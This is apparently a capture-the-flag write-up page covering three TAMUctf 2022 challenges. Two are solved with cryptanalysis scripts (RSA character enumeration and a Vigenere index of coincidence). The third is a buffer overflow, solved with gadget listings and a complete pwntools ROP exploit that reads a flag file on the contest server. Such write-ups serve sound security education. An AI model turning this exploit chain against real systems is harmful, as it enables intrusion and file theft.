@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>anomie0xff</title>
+    <link rel="stylesheet" href="https://anomie0xff.github.io/style.css">
+</head>
+
+<body>
+    <div class="header">
+        <h3><ul>
+            <li><a href="/">/anomie0xff</a></li>
+            <li><a href="/writeups">/writeups</a></li>
+            <li><a href="/pwn_bootcamp">/pwn_bootcamp</a></li>
+            <li><a href="/pwn_college">/pwn.college</a></li>
+        </ul></h3>
+    </div>
+    <section class="section">
+        <div class="container">
+            
+<h1 class="title">
+  TAMUctf 2022
+</h1>
+
+<div class="page-content">
+<h1 id="crypto-take-a-byte">Crypto - Take a Byte</h1>
+<p>We found this code along with these numbers. Any idea on what to do?</p>
+<h2 id="investigation">Investigation:</h2>
+<p>Looking at <code>data.txt</code>, we are given N, e, and then a bunch of ciphertexts. It appears as though each ciphertext is actually the encryption of a single character in the flag, so what we can do is find the ciphertext corresponding to every character, create a map from ciphertexts to characters, and decode the flag</p>
+<h2 id="solution">Solution:</h2>
+<p>Used the following script:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span>(&#39;</span><span style="color:#a3be8c;">data.txt</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">r</span><span>&#39;) </span><span style="color:#b48ead;">as </span><span>inFile:
+</span><span>    data = inFile.</span><span style="color:#bf616a;">readlines</span><span>()
+</span><span>    N = </span><span style="color:#bf616a;">int</span><span>(data[</span><span style="color:#d08770;">0</span><span>].</span><span style="color:#bf616a;">split</span><span>(&#39;</span><span style="color:#a3be8c;">=</span><span>&#39;)[</span><span style="color:#d08770;">1</span><span>].</span><span style="color:#bf616a;">strip</span><span>())
+</span><span>    e = </span><span style="color:#d08770;">65537
+</span><span>    ct = data[</span><span style="color:#d08770;">2</span><span>][</span><span style="color:#d08770;">7</span><span>:-</span><span style="color:#d08770;">2</span><span>].</span><span style="color:#bf616a;">strip</span><span>().</span><span style="color:#bf616a;">split</span><span>(&#39; &#39;)
+</span><span>
+</span><span>ct_to_chr = {}
+</span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0xff</span><span>+</span><span style="color:#d08770;">1</span><span>):
+</span><span>    ct_to_chr[</span><span style="color:#96b5b4;">pow</span><span>(i, e, N)] = </span><span style="color:#96b5b4;">chr</span><span>(i)
+</span><span>
+</span><span style="color:#96b5b4;">print</span><span>(&#39;</span><span style="color:#a3be8c;">gigem{</span><span>&#39;,</span><span style="color:#bf616a;">end</span><span>=&#39;&#39;)
+</span><span style="color:#b48ead;">for </span><span>c </span><span style="color:#b48ead;">in </span><span>ct:
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(ct_to_chr[</span><span style="color:#bf616a;">int</span><span>(c)], </span><span style="color:#bf616a;">end</span><span>=&quot;&quot;)
+</span><span style="color:#96b5b4;">print</span><span>(&#39;</span><span style="color:#a3be8c;">}</span><span>&#39;)
+</span></code></pre>
+<p>and we have flag: <code>gigem{enumerable_SeArCh_SpAcEs_4R3_WEAK_0xBEEF}</code></p>
+<h1 id="crypto-indie-co">Crypto - INdie CO</h1>
+<p>INDie COmpany Internal Message #122521
+To: Dr Friedman From: [REDACTED]</p>
+<p>We finally found that document you were looking for. It exists! However it's written in code; you're the best cryptographer we have. Decode it and get that flag!</p>
+<p>Hints: </p>
+<ul>
+<li>Dr Friedman was a real person</li>
+<li>The flag is at the end of the file</li>
+<li>The values might need some fine tuning</li>
+</ul>
+<h2 id="investigation-1">Investigation</h2>
+<p>We are given a really long ciphertext, and the curly braces at the end suggest our flag is in there.
+Some googling about friedman cryptography reveals a wikipedia for William F. Friedman, which contains mention of his the cryptanalysis tool &quot;index of coincidence&quot;. Some more googling reveals that the index of coincidence can be used to estimate the key length of a vigenere cipher.</p>
+<h2 id="solution-1">Solution</h2>
+<p>Used this script to find at where the IoC is the highest:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">import </span><span>string
+</span><span>
+</span><span>alph = </span><span style="color:#bf616a;">list</span><span>(string.ascii_uppercase)
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">getIOC</span><span>(</span><span style="color:#bf616a;">text</span><span>):
+</span><span>	letterCounts = []
+</span><span>
+</span><span>	</span><span style="color:#65737e;"># Loop through each letter in the alphabet - count number of times it appears
+</span><span>	</span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">26</span><span>):
+</span><span>		count = </span><span style="color:#d08770;">0
+</span><span>		</span><span style="color:#b48ead;">for </span><span>j </span><span style="color:#b48ead;">in </span><span>text:
+</span><span>			</span><span style="color:#b48ead;">if </span><span>j == alph[i]:
+</span><span>				count += </span><span style="color:#d08770;">1
+</span><span>		letterCounts.</span><span style="color:#bf616a;">append</span><span>(count)
+</span><span>
+</span><span>	</span><span style="color:#65737e;"># Loop through all letter counts, applying the calculation (the sigma part)
+</span><span>	total = </span><span style="color:#d08770;">0
+</span><span>	</span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#96b5b4;">len</span><span>(letterCounts)):
+</span><span>		ni = letterCounts[i]
+</span><span>		total += ni * (ni - </span><span style="color:#d08770;">1</span><span>)
+</span><span>
+</span><span>	N = </span><span style="color:#96b5b4;">len</span><span>(text)
+</span><span>	c = </span><span style="color:#d08770;">26.0 </span><span style="color:#65737e;"># Number of letters in the alphabet
+</span><span>	total = </span><span style="color:#bf616a;">float</span><span>(total) / ((N * (N - </span><span style="color:#d08770;">1</span><span>)))
+</span><span>	</span><span style="color:#b48ead;">return </span><span>total
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">getAvgIOC</span><span>(</span><span style="color:#bf616a;">array</span><span>):
+</span><span>    tot = </span><span style="color:#d08770;">0.0
+</span><span>    </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span>array:
+</span><span>        tot += </span><span style="color:#bf616a;">getIOC</span><span>(i)
+</span><span>    </span><span style="color:#b48ead;">return </span><span>tot/</span><span style="color:#96b5b4;">len</span><span>(array)
+</span><span>
+</span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span>(&#39;</span><span style="color:#a3be8c;">./data.txt</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">r</span><span>&#39;) </span><span style="color:#b48ead;">as </span><span>inF:
+</span><span>    data = inF.</span><span style="color:#bf616a;">read</span><span>().</span><span style="color:#bf616a;">replace</span><span>(&#39;</span><span style="color:#a3be8c;">{</span><span>&#39;,&#39;&#39;).</span><span style="color:#bf616a;">replace</span><span>(&#39;</span><span style="color:#a3be8c;">}</span><span>&#39;,&#39;&#39;)
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#bf616a;">getIOC</span><span>(data))
+</span><span>    </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">1</span><span>, </span><span style="color:#d08770;">30</span><span>):
+</span><span>        temp = [&#39;&#39;]*i
+</span><span>        </span><span style="color:#b48ead;">for </span><span>j,c </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">enumerate</span><span>(data):
+</span><span>            temp[j%i] += c
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(i, </span><span style="color:#bf616a;">getAvgIOC</span><span>(temp))
+</span></code></pre>
+<p>It appears that our key is 12 characters long. Using this tool: https://www.dcode.fr/vigenere-cipher and choosing the option for knowing the key length, it gives us the key: <code>MKWOFVNJOJUO</code>. Use cyber chef to decode. Strangely, the part inside the curly braces didn't decode correctly, but adding an extra character right after the opening curly brace gives the rest of the flag. Presumably this is an issue of cyber chef not decoding the curly brace so it doesn't move to the next character of the key, but the vigenere implementation to create the ciphertext probably did.</p>
+<p>flag: <code>gigem{deepfriedmanindexofcoincidence}</code></p>
+<h1 id="pwn-one-and-done">Pwn - One and Done</h1>
+<p>It's trivial, but not! There are no other files in the target than this binary and the flag at /pwn/flag.txt, so you can't use anything else!</p>
+<h2 id="investigation-2">Investigation</h2>
+<p>We are given source code:</p>
+<pre data-lang="C" style="background-color:#2b303b;color:#c0c5ce;" class="language-C "><code class="language-C" data-lang="C"><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdio.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">string.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">signal.h</span><span>&gt;
+</span><span>
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">handler</span><span>(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">sig</span><span>) {
+</span><span>    </span><span style="color:#96b5b4;">fprintf</span><span>(stderr, &quot;</span><span style="color:#a3be8c;">looks like you crashed buddy</span><span style="color:#96b5b4;">\n</span><span>&quot;);
+</span><span>    </span><span style="color:#96b5b4;">exit</span><span>(</span><span style="color:#d08770;">0</span><span>);
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span>() {
+</span><span>    </span><span style="color:#b48ead;">struct</span><span> sigaction sa;
+</span><span>    </span><span style="color:#96b5b4;">memset</span><span>(&amp;sa, &#39;</span><span style="color:#96b5b4;">\0</span><span>&#39;, sizeof(sa));
+</span><span>    sa.</span><span style="color:#bf616a;">sa_sigaction </span><span>= &amp;handler;
+</span><span>    sa.</span><span style="color:#bf616a;">sa_flags </span><span>= SA_SIGINFO;
+</span><span>    </span><span style="color:#bf616a;">sigaction</span><span>(SIGSEGV, &amp;sa, </span><span style="color:#d08770;">NULL</span><span>);
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">char</span><span> buf[</span><span style="color:#d08770;">128</span><span>];
+</span><span>
+</span><span>    </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">pwn me pls</span><span>&quot;);
+</span><span>    </span><span style="color:#96b5b4;">gets</span><span>(buf);
+</span><span>}
+</span></code></pre>
+<p>Nothing much here, guess it's ROP time. running ROPgadget, there's 755 gadgets found, so hopefully enough to do what we need. The plan is: </p>
+<ol>
+<li>write &quot;/pwn/flag.txt&quot; to a buffer</li>
+<li>open the file</li>
+<li>read the flag to a buffer</li>
+<li>write the flag from the buffer to stdout</li>
+</ol>
+<p>First, we need to find somewhere we can write and read. To do this, run the program in gdb, break while it is running and check vmmap for somewhere readable and writeable:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>gef➤  vmmap
+</span><span>[ Legend:  Code | Heap | Stack ]
+</span><span>Start              End                Offset             Perm Path
+</span><span>0x00000000400000 0x00000000401000 0x00000000000000 r-- /home/anomie/tamuctf2022/pwn/one_and_done/one-and-done
+</span><span>0x00000000401000 0x00000000403000 0x00000000001000 r-x /home/anomie/tamuctf2022/pwn/one_and_done/one-and-done
+</span><span>0x00000000403000 0x00000000404000 0x00000000003000 r-- /home/anomie/tamuctf2022/pwn/one_and_done/one-and-done
+</span><span>0x00000000404000 0x00000000406000 0x00000000003000 rw- /home/anomie/tamuctf2022/pwn/one_and_done/one-and-done
+</span><span>0x007ffff7ff9000 0x007ffff7ffd000 0x00000000000000 r-- [vvar]
+</span><span>0x007ffff7ffd000 0x007ffff7fff000 0x00000000000000 r-x [vdso]
+</span><span>0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]
+</span><span>0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]
+</span></code></pre>
+<p>We see that the memory from <code>0x00000000404000-0x00000000406000</code> fits our needs. examining the memory there, there's a bunch of null bytes around <code>0x4040a0</code>, which means it might be unused and writing there won't break anything:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>gef➤  x/64x 0x00000000404000
+</span><span>0x404000:	0x6b6f6f6c	0x696c2073	0x7920656b	0x6320756f
+</span><span>0x404010:	0x68736172	0x62206465	0x79646475	0x7770000a
+</span><span>0x404020:	0x656d206e	0x736c7020	0x65642f00	0x756e2f76
+</span><span>0x404030:	0x00006c6c	0x00000000	0x7fffffff	0xfffffffc
+</span><span>0x404040:	0xffffffff	0xffffffff	0x00000014	0x00000000
+</span><span>0x404050:	0x00527a01	0x01107801	0x08070c1b	0x00000190
+</span><span>0x404060:	0x00000018	0x0000001c	0xffffe135	0x00000035
+</span><span>0x404070:	0x100e4100	0x0d430286	0x00000006	0x0000001c
+</span><span>0x404080:	0x00000038	0xffffe14e	0x00000079	0x100e4100
+</span><span>0x404090:	0x0d430286	0x0c740206	0x00000807	0x00000000
+</span><span>0x4040a0:	0x00000000	0x00000000	0x00000000	0x00000000
+</span><span>0x4040b0:	0x00000000	0x00000000	0x00000000	0x00000000
+</span><span>0x4040c0:	0x00000000	0x00000000	0x00000000	0x00000000
+</span><span>0x4040d0:	0x00000000	0x00000000	0x00000000	0x00000000
+</span><span>0x4040e0:	0x00000000	0x00000000	0x00000000	0x00000000
+</span><span>0x4040f0:	0x00000000	0x00000000	0x00000000	0x00000000
+</span></code></pre>
+<p>Now that we have somewhere to store our data, we need to find the right gadgets to write there. ROPgadget finds this mov we can use:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>0x000000000040198d : mov dword ptr [rdi + rdx - 0x27], eax ; mov rax, rdi ; ret
+</span></code></pre>
+<p>Kinda strange, but usable as long as we can set <code>rdi</code>, <code>rdx</code>, and <code>eax</code> to what we need. Here's the gadgets to do that:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>0x0000000000401793 : pop rdi ; ret
+</span><span>0x0000000000401f31 : pop rdx ; ret
+</span><span>0x000000000040100b : pop rax ; ret
+</span></code></pre>
+<p>Note that the lowest 4 bytes of <code>rax</code> is <code>eax</code>, so this will work for setting <code>eax</code></p>
+<p>The only things left that we need are gadgets for syscall, and setting <code>rsi</code> for the args to syscalls. Here they are:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>0x0000000000401713 : pop rsi ; ret
+</span><span>0x0000000000401ab2 : syscall ; ret
+</span></code></pre>
+<p>We have all the things needed, so time to assemble the payload</p>
+<h2 id="solution-2">Solution</h2>
+<p>Here's the solve script:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>elf = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">./one-and-done</span><span>&#39;)
+</span><span>target = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">tamuctf.com</span><span>&quot;, </span><span style="color:#d08770;">443</span><span>, </span><span style="color:#bf616a;">ssl</span><span>=</span><span style="color:#d08770;">True</span><span>, </span><span style="color:#bf616a;">sni</span><span>=&quot;</span><span style="color:#a3be8c;">one-and-done</span><span>&quot;)
+</span><span style="color:#65737e;">#target = process(elf.path)
+</span><span>
+</span><span style="color:#65737e;">#gdb.attach(target, gdbscript=&#39;b *main+120&#39;)
+</span><span style="color:#65737e;">#context.binary = elf.path
+</span><span style="color:#65737e;">#context.log_level = &#39;DEBUG&#39;
+</span><span>
+</span><span>pop_rdi_ret = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x0000000000401793</span><span>)
+</span><span>pop_rdx_ret = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x0000000000401f31</span><span>)
+</span><span>pop_rax_ret = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x000000000040100b</span><span>)
+</span><span>pop_rsi_ret = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x0000000000401713</span><span>)
+</span><span>syscall_ret = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x0000000000401ab2</span><span>)
+</span><span>mov_dst_eax = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x000000000040198d</span><span>) </span><span style="color:#65737e;"># NOTE: mov dword ptr [rdi + rdx - 0x27], eax ; mov rax, rdi ; ret
+</span><span>
+</span><span>buf_addr = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x4040a0</span><span>)
+</span><span>
+</span><span>payload = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*(</span><span style="color:#d08770;">296</span><span>)
+</span><span style="color:#65737e;"># 1. write &quot;/pwn/flag.txt&quot; to memory (0x4040a0 is writable and empty)
+</span><span>rdi = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x4040a0 </span><span>+ </span><span style="color:#d08770;">0x27</span><span>)
+</span><span>rdx = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x00</span><span>)
+</span><span>eax = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x6e77702f</span><span>)
+</span><span>payload += pop_rdi_ret + rdi + pop_rdx_ret + rdx + pop_rax_ret + eax + mov_dst_eax
+</span><span>
+</span><span>rdi = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x4040a0 </span><span>+ </span><span style="color:#d08770;">0x27 </span><span>+ </span><span style="color:#d08770;">0x04</span><span>)
+</span><span>rdx = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x00</span><span>)
+</span><span>eax = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x616c662f</span><span>)
+</span><span>payload += pop_rdi_ret + rdi + pop_rdx_ret + rdx + pop_rax_ret + eax + mov_dst_eax
+</span><span>
+</span><span>rdi = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x4040a0 </span><span>+ </span><span style="color:#d08770;">0x27 </span><span>+ </span><span style="color:#d08770;">0x08</span><span>)
+</span><span>rdx = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x00</span><span>)
+</span><span>eax = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x78742e67</span><span>)
+</span><span>payload += pop_rdi_ret + rdi + pop_rdx_ret + rdx + pop_rax_ret + eax + mov_dst_eax
+</span><span>
+</span><span>rdi = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x4040a0 </span><span>+ </span><span style="color:#d08770;">0x27 </span><span>+ </span><span style="color:#d08770;">0x0c</span><span>)
+</span><span>rdx = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x00</span><span>)
+</span><span>eax = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x74</span><span>)
+</span><span>payload += pop_rdi_ret + rdi + pop_rdx_ret + rdx + pop_rax_ret + eax + mov_dst_eax
+</span><span>
+</span><span style="color:#65737e;"># 2. open the file for reading syscall:
+</span><span>rax = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x02</span><span>)
+</span><span>rdi = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x4040a0</span><span>)
+</span><span>rsi = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x00</span><span>)
+</span><span>payload += pop_rax_ret + rax + pop_rdi_ret + rdi + pop_rsi_ret + rsi + syscall_ret
+</span><span>
+</span><span style="color:#65737e;"># 3. read the file to a buffer
+</span><span>rax = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x00</span><span>)
+</span><span>rdi = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x03</span><span>)
+</span><span>rsi = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x4040a0</span><span>)
+</span><span>rdx = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0xff</span><span>)
+</span><span>payload += pop_rax_ret + rax + pop_rdi_ret + rdi + pop_rsi_ret + rsi + pop_rdx_ret + rdx + syscall_ret
+</span><span>
+</span><span style="color:#65737e;"># 4. write buffer to stdout
+</span><span>rax = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x01</span><span>)
+</span><span>rdi = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x01</span><span>)
+</span><span>rsi = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x4040a0</span><span>)
+</span><span>rdx = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0xff</span><span>)
+</span><span>payload += pop_rax_ret + rax + pop_rdi_ret + rdi + pop_rsi_ret + rsi + pop_rdx_ret + rdx + syscall_ret
+</span><span>
+</span><span style="color:#65737e;"># 5. exit() to prove ropchain executed to the end
+</span><span>rax = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">60</span><span>)
+</span><span>rdi = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x00</span><span>)
+</span><span>
+</span><span>payload += pop_rax_ret + rax + pop_rdi_ret + rdi + syscall_ret 
+</span><span>
+</span><span>target.</span><span style="color:#bf616a;">recv</span><span>()
+</span><span>target.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span><span>target.</span><span style="color:#bf616a;">interactive</span><span>()
+</span></code></pre>
+<p>flag: <code>gigem{trivial_but_its_static}</code></p>
+
+</div>
+
+        </div>
+    </section>
+</body>
+
+</html>
